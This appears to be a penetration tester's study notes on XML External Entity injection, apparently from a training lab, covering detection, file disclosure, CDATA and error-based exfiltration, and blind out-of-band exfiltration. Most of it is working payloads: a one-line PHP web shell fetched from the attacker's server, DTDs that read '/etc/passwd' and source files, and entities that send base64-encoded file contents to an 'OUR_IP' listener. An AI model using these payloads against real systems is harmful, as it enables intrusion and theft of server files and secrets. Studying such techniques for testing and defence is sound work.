> XML External Entity Injection

## Local File Disclosure
- If web app trusts unfiltered XML data from user input, we may be able to reference an external XML DTD document and define new custom XML entities.
#### Identifying
- Intercepting the request and seeing that the a form sending our data in an XML format to the web server.
- First step would be seeing if the response displays any of the values from the users input and then modifying it to see if the changes are reflected in the response.
-  Try to define a new custom entity and then use its variable in the existing entities to see whether it gets replaced with the value we defined.

eg: custom entity
```python
<!DOCTYPE email [ <!ENTITY company "Inlane Freight"> ]>
```
![[Pasted image 20260627122131.png]]

> **Note:** Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the `Content-Type` header to `application/xml`, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm). If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.

#### RCE with XXE
- Easiest method is to look for ssh keys or use a hash stealing trick in windows based applications by making a call to our server.
- We can also use the `PHP://expect` filter
- Another efficient method would be to fetch a web shell from our server and writing it to the web app and then interact with that shell.
```python
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80
```

## Advanced File Disclosure

#### Advanced Exfiltration with CDATA
- Basic XXE breaks on special chars in file content (PHP, binary, etc.)
- CDATA (`<![CDATA[ ... ]]>`) tells XML parser to treat content as raw data
- **Problem**: Can't join internal + external entities directly in XML
- **Solution**: Use XML Parameter Entities (`%entity`) — when referenced from an **external DTD**, all entities are treated as external and can be joined

##### Setup: Host the DTD file
```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```

##### XML Payload
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %xxe;
]>
...
<email>&joined;</email>
```

> **Note**: Some modern web servers block self-referencing entities (DoS protection), which may prevent reading files like `index.php`.

> **Tip**: This trick is especially useful when basic XXE fails or when dealing with non-PHP frameworks (where PHP wrappers like `php://filter` are unavailable).

## Error Based XXE
- Use when web app writes **no output** (blind to XML output) but **displays runtime errors** (e.g., PHP errors)
- First confirm errors are shown — send malformed XML (delete a closing tag, rename `<root>` to `<roo>`, or reference a non-existing entity like `&nonExistingEntity;`)

##### Setup: Host the DTD file
```bash
echo '<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '\''%nonExistingEntity;/%file;'\''">' > xxe.dtd
python3 -m http.server 8000
```

> This defines `%file` pointing to the target file, then joins it with `%nonExistingEntity;` (which doesn't exist) to trigger an error that leaks the file content.

##### XML Payload
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

##### Reading Source Code
- Change the file path in `xxe.dtd` to target source files, e.g., `"file:///var/www/html/submitDetails.php"`

> **Limitations**: Less reliable than CDATA method for source code — may have length limits and certain special characters can still break the output.


## Blind Data Exfiltration
- Completely blind — no XML output, no error messages. Use **Out-of-Band (OOB)** exfiltration via HTTP/DNS callbacks.

#### Manual OOB Exfiltration
- Base64-encode the target file via PHP filter, then exfiltrate it as a URL parameter in a request to our server.

##### Setup: `index.php` listener
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```
```bash
php -S 0.0.0.0:8000
```

##### DTD file (`xxe.dtd`)
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

##### XML Payload
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

> **Tip**: Can also use **DNS OOB** — place encoded data as a subdomain (`ENCODEDTEXT.our.website.com`) and capture with `tcpdump`.
